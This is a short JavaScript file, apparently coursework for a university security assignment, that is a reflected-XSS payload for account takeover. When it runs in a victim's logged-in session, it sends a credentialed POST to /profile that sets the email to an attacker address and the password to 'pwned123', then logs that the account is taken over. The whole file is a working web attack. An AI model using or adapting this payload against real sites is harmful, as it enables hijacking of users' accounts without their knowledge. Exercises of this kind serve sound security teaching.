// FIT5003 A2 - Part B.2 reflected-XSS payload (account takeover).

(function () {
  var body = "email=attacker@evil.example&password=pwned123";
  fetch("/profile", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: body,
    credentials: "include"
  }).then(function () {
    // Visible proof the payload fired (optional).
    console.log("[payload] profile updated - account taken over");
  });
})();
